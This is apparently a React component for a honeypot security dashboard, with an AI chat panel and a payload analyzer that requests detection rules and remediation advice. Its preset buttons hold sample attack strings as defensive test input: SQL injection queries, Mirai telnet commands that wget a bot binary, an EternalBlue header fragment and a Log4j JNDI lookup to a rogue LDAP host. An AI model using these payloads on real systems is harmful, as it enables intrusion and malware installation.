import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Sparkles, Cpu, Send, Terminal, Shield, Zap, Check, Copy, 
  Play, Wrench, BookOpen, AlertTriangle, Globe, RefreshCw, 
  AlertCircle, MessageSquare, ChevronRight, CornerDownLeft
} from 'lucide-react';
import { AttackEvent, AIThreatReport, SeverityLevel } from '../types';

interface AIAnalyzerProps {
  recentAttacks: AttackEvent[];
  pushGrowl: (message: string, severity: SeverityLevel) => void;
  onAddSimulatedAttack?: (attack: AttackEvent) => void;
}

interface ChatMessage {
  id: string;
  role: 'user' | 'model';
  text: string;
  timestamp: string;
}

export default function AIAnalyzer({ recentAttacks, pushGrowl, onAddSimulatedAttack }: AIAnalyzerProps) {
  // Navigation: 'chat' | 'payload'
  const [subTab, setSubTab] = useState<'chat' | 'payload'>('chat');

  // --- PLAYLOAD ANALYZER STATES ---
  const [targetPort, setTargetPort] = useState<number>(80);
  const [protocol, setProtocol] = useState<string>('HTTP');
  const [sourceIP, setSourceIP] = useState<string>('185.220.101.5');
  const [payloadBuffer, setPayloadBuffer] = useState<string>('GET /admin/login.php?user=%27%20OR%20%271%27%3D%271%20--%20HTTP/1.1\nHost: target-node\nUser-Agent: sqlmap/1.4.12');
  const [isAnalyzing, setIsAnalyzing] = useState<boolean>(false);
  const [analysisResult, setAnalysisResult] = useState<AIThreatReport | null>(null);
  const [activeRuleTab, setActiveRuleTab] = useState<'yara' | 'snort' | 'sigma' | 'suricata' | 'iptables'>('yara');
  const [analysisStep, setAnalysisStep] = useState<string>('');
  const [copiedRule, setCopiedRule] = useState<string | null>(null);

  // --- AI CHAT STATES ---
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([
    {
      id: 'init-msg',
      role: 'model',
      text: 'Greetings, Operator. I am the CYBER-EYE Tactical AI Threat Assistant. I have linked directly into the active HoneyBot telemetry channels.\n\nAsk me anything regarding current security incidents, exploit signatures, CVE vulnerability patching, or custom firewall rules. Select one of the quick presets below, or enter your query to begin.',
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    }
  ]);
  const [chatInput, setChatInput] = useState<string>('');
  const [isChatLoading, setIsChatLoading] = useState<boolean>(false);
  const chatBottomRef = useRef<HTMLDivElement>(null);

  // Auto scroll chat to bottom
  useEffect(() => {
    if (chatBottomRef.current) {
      chatBottomRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [chatMessages, isChatLoading]);

  // Copy helper
  const handleCopyText = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedRule(label);
    pushGrowl(`Copied ${label} signature to clipboard`, 'Low');
    setTimeout(() => setCopiedRule(null), 3000);
  };

  // Custom Payload presets
  const applyPayloadPreset = (port: number, proto: string, ip: string, payload: string) => {
    setTargetPort(port);
    setProtocol(proto);
    setSourceIP(ip);
    setPayloadBuffer(payload);
    pushGrowl('Applied diagnostic preset buffer', 'Low');
  };

  // Run Custom AI Payload analysis
  const handleAnalyzePayload = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!payloadBuffer.trim()) {
      pushGrowl('Analysis buffer cannot be empty', 'Medium');
      return;
    }

    setIsAnalyzing(true);
    setAnalysisResult(null);

    // Simulate stepping through analytical phases for a highly realistic visual feedback
    const steps = [
      'Extracting buffer hex sequences...',
      'Mapping payload signatures to MITRE ATT&CK framework...',
      'Analyzing protocol constraints and exploit mechanics...',
      'Synthesizing detection rules (YARA, Sigma, Snort)...',
      'Formulating actionable step-by-step remediation plan...'
    ];

    for (let i = 0; i < steps.length; i++) {
      setAnalysisStep(steps[i]);
      await new Promise(resolve => setTimeout(resolve, 600));
    }

    try {
      const response = await fetch('/api/ai/analyze-custom', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          payload: payloadBuffer,
          protocol,
          destPort: targetPort,
          sourceIP
        })
      });

      const data = await response.json();
      if (response.ok && data.success) {
        setAnalysisResult(data.analysis);
        pushGrowl('AI Threat Assessment completed successfully', 'Low');
      } else {
        pushGrowl('Threat analysis request failed on backend.', 'Critical');
      }
    } catch (err) {
      pushGrowl('Failed to contact Threat intelligence backend.', 'Critical');
    } finally {
      setIsAnalyzing(false);
    }
  };

  // Deploy Analyzed custom incident to active honeypot logs
  const handleDeployIncident = async () => {
    if (!analysisResult) return;

    try {
      // Simulate registering an attack directly using ESP32 registration endpoint
      const response = await fetch('/api/device/event', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chipId: 'ESP32_A8F932', // Seed under primary Honeypot
          sourceIP,
          destPort: targetPort,
          protocol,
          payload: payloadBuffer,
          connectionCount: 1
        })
      });

      const data = await response.json();
      if (response.ok && data.success) {
        pushGrowl('Custom Incident successfully injected into active SOC Telemetry streams!', 'High');
      } else {
        pushGrowl('Failed to inject incident into live stream.', 'Medium');
      }
    } catch (e) {
      pushGrowl('Endpoint transmission timed out.', 'Critical');
    }
  };

  // Send Chat message to Gemini
  const handleSendChatMessage = async (e?: React.FormEvent, customMsg?: string) => {
    if (e) e.preventDefault();
    const query = customMsg || chatInput;
    if (!query.trim() || isChatLoading) return;

    const userMessage: ChatMessage = {
      id: Math.random().toString(),
      role: 'user',
      text: query,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };

    setChatMessages(prev => [...prev, userMessage]);
    if (!customMsg) setChatInput('');
    setIsChatLoading(true);

    try {
      // Construct prompt history for standard chat format
      const history = chatMessages.slice(-8).map(msg => ({
        role: msg.role,
        text: msg.text
      }));

      const response = await fetch('/api/ai/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: query,
          history
        })
      });

      const data = await response.json();
      if (response.ok && data.success) {
        const botMessage: ChatMessage = {
          id: Math.random().toString(),
          role: 'model',
          text: data.reply,
          timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
        };
        setChatMessages(prev => [...prev, botMessage]);
      } else {
        pushGrowl('tactical intelligence link error.', 'Critical');
      }
    } catch (err) {
      pushGrowl('Failed to query the AI Tactical core.', 'Critical');
    } finally {
      setIsChatLoading(false);
    }
  };

  // Suggestion chips presets
  const chatPresets = [
    'Generate YARA signature for Log4j vulnerability',
    'How do I mitigate SSH brute force attempts?',
    'Explain MITRE technique T1046 (Network Service Discovery)',
    'Summarize current CYBER-EYE security posture'
  ];

  return (
    <div className="space-y-6" id="ai-analyzer-canvas">
      {/* Header Panel */}
      <div className="bg-[#090b20]/40 border border-blue-950 rounded-2xl p-5 flex flex-col md:flex-row justify-between items-center gap-4">
        <div className="space-y-1">
          <div className="flex items-center gap-2">
            <Sparkles className="w-5 h-5 text-blue-400 animate-pulse" />
            <h2 className="text-lg font-black text-white font-mono uppercase tracking-wider">AI Cognitive Threat Laboratory</h2>
          </div>
          <p className="text-xs text-gray-400 font-sans leading-relaxed">
            Harness real-time cognitive insights to analyze custom buffer logs, ask security analysts questions, and deploy customized detection signatures.
          </p>
        </div>

        {/* Tab switcher */}
        <div className="flex bg-[#040612] p-1 border border-blue-950/80 rounded-xl font-mono text-xs">
          <button
            onClick={() => setSubTab('chat')}
            className={`px-4 py-2 rounded-lg font-bold transition-all cursor-pointer flex items-center gap-2 ${subTab === 'chat' ? 'bg-blue-600 text-white shadow-lg' : 'text-gray-400 hover:text-white'}`}
          >
            <MessageSquare className="w-3.5 h-3.5" />
            Tactical SOC Chatbot
          </button>
          <button
            onClick={() => setSubTab('payload')}
            className={`px-4 py-2 rounded-lg font-bold transition-all cursor-pointer flex items-center gap-2 ${subTab === 'payload' ? 'bg-blue-600 text-white shadow-lg' : 'text-gray-400 hover:text-white'}`}
          >
            <Cpu className="w-3.5 h-3.5" />
            Exploit Payload Analyzer
          </button>
        </div>
      </div>

      {/* SUB-TAB 1: TACTICAL SOC CHATBOT */}
      {subTab === 'chat' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-stretch" id="ai-chatbot-view">
          {/* Chat Window */}
          <div className="lg:col-span-8 bg-[#090b20]/60 border border-blue-950 rounded-2xl p-5 flex flex-col h-[600px] shadow-2xl relative">
            <div className="border-b border-blue-950/80 pb-3 mb-4 flex items-center justify-between">
              <div className="flex items-center gap-2.5">
                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
                <span className="text-xs font-mono font-bold text-white uppercase tracking-wider">Live AI Specialist Session</span>
              </div>
              <span className="text-[10px] text-gray-500 font-mono">Model: gemini-3.6-flash</span>
            </div>

            {/* Messages area */}
            <div className="flex-1 overflow-y-auto space-y-4 pr-1 scrollbar-thin">
              {chatMessages.map((msg) => (
                <div
                  key={msg.id}
                  className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}
                >
                  <div className={`max-w-[85%] rounded-2xl px-4 py-3 text-xs leading-relaxed font-sans shadow-lg ${
                    msg.role === 'user' 
                      ? 'bg-blue-600 text-white rounded-br-none' 
                      : 'bg-[#040612]/90 border border-blue-950/60 text-gray-200 rounded-bl-none font-sans'
                  }`}>
                    {/* Role header */}
                    <div className="flex justify-between items-center text-[9px] text-gray-400 font-mono mb-1.5 border-b border-white/5 pb-1">
                      <span className="font-bold tracking-wider uppercase">
                        {msg.role === 'user' ? 'Operator' : 'AI threat analyst'}
                      </span>
                      <span>{msg.timestamp}</span>
                    </div>

                    {/* Markdown rendering simulation (simple blocks format since we keep it clean) */}
                    <p className="whitespace-pre-line leading-relaxed font-sans">{msg.text}</p>
                  </div>
                </div>
              ))}

              {isChatLoading && (
                <div className="flex justify-start">
                  <div className="bg-[#040612]/90 border border-blue-950/60 rounded-2xl rounded-bl-none px-4 py-3 text-xs text-gray-400 font-mono shadow-lg flex items-center gap-2">
                    <span className="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce"></span>
                    <span className="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce delay-100"></span>
                    <span className="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce delay-200"></span>
                    <span>AI Specialist is formulating threat analysis...</span>
                  </div>
                </div>
              )}
              <div ref={chatBottomRef} />
            </div>

            {/* Input form */}
            <form onSubmit={handleSendChatMessage} className="mt-4 flex gap-2 pt-3 border-t border-blue-950/80">
              <input
                type="text"
                value={chatInput}
                onChange={(e) => setChatInput(e.target.value)}
                placeholder="Ask me to write a detection signature, analyze ports, or draft a mitigation playbook..."
                className="flex-1 bg-[#040612] border border-blue-950 rounded-xl px-4 py-3 text-xs text-white placeholder-gray-500 focus:outline-none focus:border-blue-500"
              />
              <button
                type="submit"
                disabled={isChatLoading || !chatInput.trim()}
                className="px-4 bg-blue-600 hover:bg-blue-500 disabled:bg-gray-800 text-white rounded-xl transition-all cursor-pointer flex items-center justify-center gap-1.5"
              >
                <Send className="w-4 h-4" />
                <span className="hidden sm:inline font-mono text-xs font-bold">SEND</span>
              </button>
            </form>
          </div>

          {/* Right sidebar presets */}
          <div className="lg:col-span-4 space-y-6 flex flex-col justify-between">
            <div className="bg-[#090b20]/60 border border-blue-950 rounded-2xl p-5 space-y-4">
              <div className="border-b border-blue-950/80 pb-3">
                <h3 className="text-xs font-black text-white font-mono uppercase tracking-wider flex items-center gap-2">
                  <Wrench className="w-4 h-4 text-blue-500" />
                  Tactical Prompt Presets
                </h3>
              </div>
              
              <p className="text-xs text-gray-400 leading-relaxed font-sans">
                Click any of the high-frequency prompt presets below to request instant tactical intelligence from the AI core:
              </p>

              <div className="space-y-2.5">
                {chatPresets.map((preset) => (
                  <button
                    key={preset}
                    type="button"
                    onClick={(e) => handleSendChatMessage(e, preset)}
                    disabled={isChatLoading}
                    className="w-full text-left p-3 bg-[#040612]/60 hover:bg-blue-950/30 border border-blue-950 hover:border-blue-500 rounded-xl transition-all text-xs font-mono text-blue-400 leading-relaxed cursor-pointer flex items-start gap-2 group"
                  >
                    <ChevronRight className="w-4 h-4 flex-shrink-0 text-blue-600 group-hover:text-blue-400 mt-0.5 transition-colors" />
                    <span>{preset}</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Model stats panel */}
            <div className="bg-[#090b20]/40 border border-blue-950 rounded-2xl p-5 font-mono text-[11px] text-gray-400 space-y-2.5">
              <span className="text-[10px] text-gray-500 block uppercase font-bold tracking-wider">AI Operations Status</span>
              <div className="flex justify-between border-b border-blue-950/40 pb-1.5">
                <span>Inference Model:</span>
                <span className="text-white font-bold">gemini-3.6-flash</span>
              </div>
              <div className="flex justify-between border-b border-blue-950/40 pb-1.5">
                <span>Context Token Limit:</span>
                <span className="text-white">1,048,576 tokens</span>
              </div>
              <div className="flex justify-between">
                <span>Latency Threshold:</span>
                <span className="text-emerald-400">~1.2s Real-time</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* SUB-TAB 2: EXPLOIT PAYLOAD ANALYZER */}
      {subTab === 'payload' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start" id="exploit-analyzer-view">
          {/* Left Inputs panel */}
          <div className="lg:col-span-5 bg-[#090b20]/60 border border-blue-950 rounded-2xl p-5 space-y-5 shadow-2xl">
            <div className="border-b border-blue-950/80 pb-3">
              <h3 className="text-xs font-black text-white font-mono uppercase tracking-wider flex items-center gap-2">
                <Terminal className="w-4 h-4 text-blue-500" />
                Raw Capture Buffer Ingestion
              </h3>
            </div>

            {/* Presets dropdown selector */}
            <div className="space-y-2">
              <span className="text-[10px] text-gray-500 font-mono block uppercase font-bold tracking-wider">Diagnostic Exploit Presets:</span>
              <div className="grid grid-cols-2 gap-2 text-[10px] font-mono">
                <button
                  type="button"
                  onClick={() => applyPayloadPreset(80, 'HTTP', '185.220.101.5', 'GET /index.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users%20HTTP/1.1\nHost: main-decoy\nUser-Agent: sqlmap')}
                  className="px-2.5 py-2 bg-[#040612] border border-blue-950 hover:border-blue-500 text-blue-400 rounded-lg transition-all cursor-pointer truncate"
                >
                  Web SQLi Bypass
                </button>
                <button
                  type="button"
                  onClick={() => applyPayloadPreset(23, 'Telnet', '45.143.203.14', 'root\nadmin\n/bin/busybox Mirai\nenable\nsh\ncd /tmp && wget http://mirai-bin/mirai.x86')}
                  className="px-2.5 py-2 bg-[#040612] border border-blue-950 hover:border-blue-500 text-blue-400 rounded-lg transition-all cursor-pointer truncate"
                >
                  Mirai IoT Botnet
                </button>
                <button
                  type="button"
                  onClick={() => applyPayloadPreset(445, 'SMB', '198.51.100.42', '\\xFF\\x53\\x4D\\x42\\x72\\x00\\x00\\x00\\x00\\x18\\x53\\xC8\\x00\\x00 (EternalBlue MS17-010 negotiation header packet)')}
                  className="px-2.5 py-2 bg-[#040612] border border-blue-950 hover:border-blue-500 text-blue-400 rounded-lg transition-all cursor-pointer truncate"
                >
                  EternalBlue SMB
                </button>
                <button
                  type="button"
                  onClick={() => applyPayloadPreset(80, 'HTTP', '82.102.23.45', 'GET / HTTP/1.1\nHost: decoy\nUser-Agent: ${jndi:ldap://rogue-ldap-server:1389/Exploit} (Log4j CVE-2021-44228)')}
                  className="px-2.5 py-2 bg-[#040612] border border-blue-950 hover:border-blue-500 text-blue-400 rounded-lg transition-all cursor-pointer truncate"
                >
                  Log4j Shell Exploit
                </button>
              </div>
            </div>

            <form onSubmit={handleAnalyzePayload} className="space-y-4 font-mono text-xs">
              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1.5">
                  <label className="text-[10px] text-gray-500 uppercase tracking-wider block font-bold">Target Port</label>
                  <input
                    type="number"
                    value={targetPort}
                    onChange={(e) => setTargetPort(parseInt(e.target.value, 10))}
                    className="w-full bg-[#040612] border border-blue-950 rounded-xl p-2.5 text-white focus:outline-none focus:border-blue-500"
                  />
                </div>
                <div className="space-y-1.5">
                  <label className="text-[10px] text-gray-500 uppercase tracking-wider block font-bold">Protocol</label>
                  <select
                    value={protocol}
                    onChange={(e) => setProtocol(e.target.value)}
                    className="w-full bg-[#040612] border border-blue-950 rounded-xl p-2.5 text-white focus:outline-none focus:border-blue-500"
                  >
                    <option value="HTTP">HTTP</option>
                    <option value="SSH">SSH</option>
                    <option value="Telnet">Telnet</option>
                    <option value="MySQL">MySQL</option>
                    <option value="SMB">SMB</option>
                    <option value="Redis">Redis</option>
                    <option value="RDP">RDP</option>
                    <option value="TCP">TCP Generic</option>
                  </select>
                </div>
              </div>

              <div className="space-y-1.5">
                <label className="text-[10px] text-gray-500 uppercase tracking-wider block font-bold">Attacker Source IP</label>
                <input
                  type="text"
                  value={sourceIP}
                  onChange={(e) => setSourceIP(e.target.value)}
                  placeholder="e.g., 45.143.203.14"
                  className="w-full bg-[#040612] border border-blue-950 rounded-xl p-2.5 text-white focus:outline-none focus:border-blue-500"
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-[10px] text-gray-500 uppercase tracking-wider block font-bold">Raw Payload Buffer / Logs</label>
                <textarea
                  value={payloadBuffer}
                  onChange={(e) => setPayloadBuffer(e.target.value)}
                  placeholder="Paste hex dump, malicious command, log files, or raw requests buffer..."
                  rows={6}
                  className="w-full bg-[#040612] border border-blue-950 rounded-xl p-3 text-cyan-400 focus:outline-none focus:border-blue-500 resize-none font-mono"
                />
              </div>

              <button
                type="submit"
                disabled={isAnalyzing}
                className="w-full py-3.5 bg-blue-600 hover:bg-blue-500 disabled:bg-gray-800 text-white font-bold rounded-xl transition-all cursor-pointer flex items-center justify-center gap-2 font-mono group"
              >
                {isAnalyzing ? (
                  <RefreshCw className="w-4 h-4 animate-spin text-white" />
                ) : (
                  <>
                    <Play className="w-3.5 h-3.5 fill-white" />
                    Cognitive AI Assessment
                  </>
                )}
              </button>
            </form>
          </div>

          {/* Right Results panel */}
          <div className="lg:col-span-7 space-y-6">
            {/* Holographic Loader */}
            {isAnalyzing && (
              <div className="bg-[#090b20]/60 border border-blue-500/30 rounded-2xl p-16 text-center flex flex-col items-center justify-center space-y-4 shadow-[0_0_20px_rgba(59,130,246,0.1)] h-[550px]" id="payload-analyzing-loader">
                <div className="relative w-16 h-16">
                  <div className="absolute inset-0 border-4 border-blue-600/20 border-t-blue-500 rounded-full animate-spin"></div>
                  <div className="absolute inset-2 border-4 border-cyan-500/10 border-b-cyan-400 rounded-full animate-spin [animation-direction:reverse]"></div>
                  <Cpu className="w-6 h-6 text-blue-400 absolute inset-0 m-auto animate-pulse" />
                </div>
                <div className="space-y-1">
                  <h4 className="text-sm font-bold text-white uppercase font-mono tracking-widest">Running AI Threat Engine</h4>
                  <p className="text-xs text-gray-500 font-mono animate-pulse">{analysisStep}</p>
                </div>
              </div>
            )}

            {/* Awaiting initial action */}
            {!isAnalyzing && !analysisResult && (
              <div className="bg-[#090b20]/20 border border-blue-950 rounded-2xl p-24 text-center flex flex-col items-center justify-center space-y-4 h-[550px]" id="payload-awaiting-view">
                <Cpu className="w-12 h-12 text-gray-700 animate-pulse" />
                <div className="space-y-1">
                  <h4 className="text-xs font-mono font-bold text-gray-500 uppercase">Threat Model Ready</h4>
                  <p className="text-xs text-gray-600 font-sans max-w-sm mx-auto leading-relaxed">
                    Awaiting buffer ingestion. Paste a payload on the left and trigger the Cognitive assessment core to evaluate threat matrix.
                  </p>
                </div>
              </div>
            )}

            {/* Assessment results */}
            {!isAnalyzing && analysisResult && (
              <div className="bg-[#090b20]/60 border border-blue-950 rounded-2xl p-6 space-y-6 shadow-2xl relative" id="payload-results-panel">
                
                {/* Header overview and score gauges */}
                <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 border-b border-blue-950 pb-4">
                  <div className="space-y-1">
                    <span className="text-[10px] text-gray-500 font-mono block uppercase tracking-wider font-bold">ANALYZED THREAT CLASSIFICATION</span>
                    <h3 className="text-lg font-black text-white font-mono">{analysisResult.attackType}</h3>
                    <div className="flex flex-wrap items-center gap-2 text-[10px] font-mono">
                      <span className={`px-2 py-0.5 rounded border font-bold uppercase ${
                        analysisResult.severity === 'Critical' ? 'bg-red-950 text-red-400 border-red-900' :
                        analysisResult.severity === 'High' ? 'bg-orange-950 text-orange-400 border-orange-900' :
                        'bg-blue-950 text-blue-400 border-blue-900'
                      }`}>
                        {analysisResult.severity} RISK
                      </span>
                      <span className="text-gray-500">Confidence:</span>
                      <span className="text-emerald-400 font-bold">{analysisResult.confidence}%</span>
                    </div>
                  </div>

                  <div className="flex items-center gap-3 bg-[#040612] px-4 py-3 border border-blue-950 rounded-xl">
                    <div className="text-right font-mono">
                      <span className="text-[10px] text-gray-500 block uppercase">THREAT INDEX</span>
                      <span className="text-lg font-black text-red-500 leading-none">{analysisResult.threatScore}/100</span>
                    </div>
                    <div className="w-1.5 h-8 bg-red-600/30 rounded-full overflow-hidden">
                      <div className="bg-red-500 h-full" style={{ height: `${analysisResult.threatScore}%` }}></div>
                    </div>
                  </div>
                </div>

                {/* MITRE & CVE blocks */}
                <div className="grid grid-cols-2 gap-4 font-mono text-xs">
                  <div className="p-3 bg-[#040612] border border-blue-950 rounded-xl">
                    <span className="text-[10px] text-gray-500 block uppercase">MITRE ATT&CK Mapping</span>
                    <span className="text-white font-bold block mt-0.5">{analysisResult.mitreAttack}</span>
                  </div>
                  <div className="p-3 bg-[#040612] border border-blue-950 rounded-xl">
                    <span className="text-[10px] text-gray-500 block uppercase">Identified CVE Vector</span>
                    <span className="text-blue-400 font-bold block mt-0.5">{analysisResult.possibleCve}</span>
                  </div>
                </div>

                {/* Executive Description */}
                <div className="space-y-2">
                  <span className="text-[10px] text-gray-500 font-mono block uppercase font-bold">EXECUTIVE INVESTIGATION DETAILS</span>
                  <p className="bg-[#040612]/70 p-4 border border-blue-950 rounded-xl text-xs font-sans text-gray-300 leading-relaxed">
                    {analysisResult.incidentSummary}
                  </p>
                </div>

                {/* Collapsible rule blocks */}
                <div className="space-y-2">
                  <div className="flex justify-between items-center">
                    <span className="text-[10px] text-gray-500 font-mono block uppercase font-bold">SYNTHESIZED NIDS SIGNATURES</span>
                    <button
                      onClick={() => {
                        const code = 
                          activeRuleTab === 'yara' ? analysisResult.yaraRule :
                          activeRuleTab === 'snort' ? analysisResult.snortRule :
                          activeRuleTab === 'sigma' ? analysisResult.sigmaRule :
                          activeRuleTab === 'suricata' ? analysisResult.suricataRule :
                          analysisResult.firewallRule;
                        handleCopyText(code, activeRuleTab.toUpperCase());
                      }}
                      className="text-[10px] font-mono text-blue-400 hover:underline cursor-pointer flex items-center gap-1"
                    >
                      {copiedRule === activeRuleTab.toUpperCase() ? (
                        <>
                          <Check className="w-3 h-3 text-emerald-400" />
                          Copied!
                        </>
                      ) : (
                        <>
                          <Copy className="w-3 h-3" />
                          Copy {activeRuleTab.toUpperCase()} Rule
                        </>
                      )}
                    </button>
                  </div>

                  {/* Tabs rule navigator */}
                  <div className="bg-[#040612] border border-blue-950/80 rounded-xl overflow-hidden shadow-inner">
                    <div className="flex border-b border-blue-950 bg-[#03040a]/80 font-mono text-[10px]">
                      {(['yara', 'snort', 'sigma', 'suricata', 'iptables'] as const).map((tab) => (
                        <button
                          key={tab}
                          onClick={() => setActiveRuleTab(tab)}
                          className={`px-3 py-2.5 font-bold border-r border-blue-950/80 cursor-pointer transition-all ${activeRuleTab === tab ? 'bg-[#040612] text-white border-b border-b-blue-500' : 'text-gray-500 hover:text-gray-300'}`}
                        >
                          {tab.toUpperCase()}
                        </button>
                      ))}
                    </div>

                    <div className="p-4 overflow-x-auto max-h-[160px] scrollbar-thin">
                      <pre className="text-[11px] font-mono text-cyan-400 leading-relaxed select-all break-all whitespace-pre-wrap">
                        {activeRuleTab === 'yara' && analysisResult.yaraRule}
                        {activeRuleTab === 'snort' && analysisResult.snortRule}
                        {activeRuleTab === 'sigma' && analysisResult.sigmaRule}
                        {activeRuleTab === 'suricata' && analysisResult.suricataRule}
                        {activeRuleTab === 'iptables' && analysisResult.firewallRule}
                      </pre>
                    </div>
                  </div>
                </div>

                {/* Remediation guidance check-lists */}
                <div className="space-y-2">
                  <span className="text-[10px] text-gray-500 font-mono block uppercase font-bold">THREAT REMEDIATION CHECKLIST</span>
                  <div className="space-y-1.5 font-sans text-xs text-gray-300">
                    {analysisResult.recommendations.map((rec, idx) => (
                      <div key={idx} className="flex gap-2 bg-[#040612] p-3 border border-blue-950 rounded-xl items-start">
                        <Check className="w-4 h-4 text-emerald-500 flex-shrink-0 mt-0.5" />
                        <span>{rec}</span>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Inject simulation button */}
                <div className="border-t border-blue-950/80 pt-4 flex justify-between items-center">
                  <div className="text-xs text-gray-500 font-mono flex items-center gap-1.5">
                    <AlertTriangle className="w-4 h-4 text-yellow-500 animate-pulse" />
                    <span>Deployable sandbox signature validated</span>
                  </div>

                  <button
                    onClick={handleDeployIncident}
                    className="px-5 py-2.5 bg-red-600 hover:bg-red-500 text-white font-mono font-bold text-xs rounded-xl shadow-lg transition-all cursor-pointer flex items-center gap-2 group"
                  >
                    <CornerDownLeft className="w-3.5 h-3.5 group-hover:-translate-x-0.5 transition-transform" />
                    Deploy to Active Honeypot Logs
                  </button>
                </div>

              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
